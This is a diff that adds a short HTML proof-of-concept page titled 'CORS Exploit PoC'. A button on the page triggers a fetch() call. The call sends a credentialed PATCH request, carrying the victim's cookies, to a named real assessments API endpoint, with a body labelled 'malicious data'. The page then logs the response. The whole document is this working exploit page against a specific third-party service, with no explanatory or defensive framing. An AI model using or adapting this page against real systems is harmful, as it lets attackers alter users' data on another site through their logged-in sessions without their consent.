@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <button onclick="exploit()">Send Exploit</button>
+
+    <script>
+        function exploit() {
+            fetch("https://learn.acronis.com/api/assessment/v1/learn/assessments", {
+                method: "PATCH",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ "data": "malicious data" })
+            })
+            .then(response => response.text())
+            .then(data => console.log("Response:", data))
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
